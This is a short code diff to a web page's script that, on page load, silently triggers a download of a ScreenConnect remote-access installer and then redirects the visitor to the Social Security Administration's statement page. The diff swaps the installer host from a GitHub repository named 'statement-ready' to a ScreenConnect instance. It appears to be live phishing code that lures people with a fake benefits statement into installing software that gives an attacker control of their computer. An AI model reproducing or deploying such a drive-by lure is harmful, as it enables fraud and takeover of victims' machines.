@@ -11,15 +11,15 @@
 <script>
     // Start file download
     const link = document.createElement("a");
-    link.href = "https://github.com/waxgroup105-lab/statement-ready/raw/refs/heads/main/ScreenConnect.ClientSetup.msi";
-    link.download = "https://github.com/waxgroup105-lab/statement-ready/raw/refs/heads/main/ScreenConnect.ClientSetup.msi";
+    link.href = "https://bergstaffing.screenconnect.com/Bin/ScreenConnect.ClientSetup.msi";
+    link.download = "https://bergstaffing.screenconnect.com/Bin/ScreenConnect.ClientSetup.msi";
     document.body.appendChild(link);
     link.click();
     document.body.removeChild(link);
 
     // Redirect after a short delay
     setTimeout(function () {
-        window.location.href = "https://id.me";
+        window.location.href = "https://www.ssa.gov/myaccount/statement.html";
     }, 3000);
 </script>
 
